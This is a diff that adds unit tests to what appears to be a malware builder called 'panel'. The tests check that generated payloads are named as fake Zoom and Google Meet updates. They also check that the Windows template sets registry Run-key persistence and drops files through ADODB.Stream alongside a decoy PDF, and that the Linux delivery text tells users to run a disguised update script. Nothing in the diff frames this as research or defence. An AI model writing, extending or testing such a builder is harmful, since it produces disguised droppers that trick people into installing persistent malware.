@@ -1,6 +1,7 @@
 import base64
 import dataclasses
 
+from panel import build
 from panel.build import (
     TARGETS,
     BuildRequest,
@@ -76,6 +77,32 @@ def test_delivery_block_mentions_sha():
 def test_slug_is_eight():
     assert len(slug()) == 8
     assert len({slug() for _ in range(50)}) > 1
+
+
+def test_profiles_naming():
+    assert build.PROFILES["zoom"]["linux"] == "zoom-update"
+    assert build.PROFILES["meet"]["linux"] == "google-meet-update"
+    req_zoom = BuildRequest(doc_name="d", profile="zoom")
+    req_meet = BuildRequest(doc_name="d", profile="meet")
+    assert req_zoom.naming["win"].startswith("Zoom")
+    assert req_meet.naming["mac"].startswith("Google Meet")
+
+
+def test_windows_template_persists():
+    out = render_windows(
+        "Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h", "Zoom Update"
+    )
+    assert "CurrentVersion\\Run\\Fleetab12" in out
+    assert "RegWrite" in out
+    assert "ADODB.Stream" in out
+    assert "SaveToFile" in out
+    assert "Zoom Update" in out
+
+
+def test_linux_naming_and_delivery():
+    name = "zoom-update-ab12.tar.gz"
+    block = delivery_block("linux", name, "Zoom Update", "sha")
+    assert "./zoom-update-ab12.sh" in block
 
 
 def test_load_build_request(tmp_settings):
